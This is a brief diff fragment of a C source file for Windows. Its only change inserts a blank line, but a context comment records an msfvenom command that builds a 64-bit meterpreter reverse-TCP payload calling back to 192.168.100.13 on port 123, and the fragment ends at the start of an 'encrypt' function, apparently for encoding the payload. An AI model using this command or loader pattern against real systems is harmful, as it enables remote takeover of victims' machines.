@@ -2,6 +2,7 @@
 #include <windows.h>
 
 
+
 /* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/
 
 void encrypt(unsigned char *data, SIZE_T data_size, char key) {
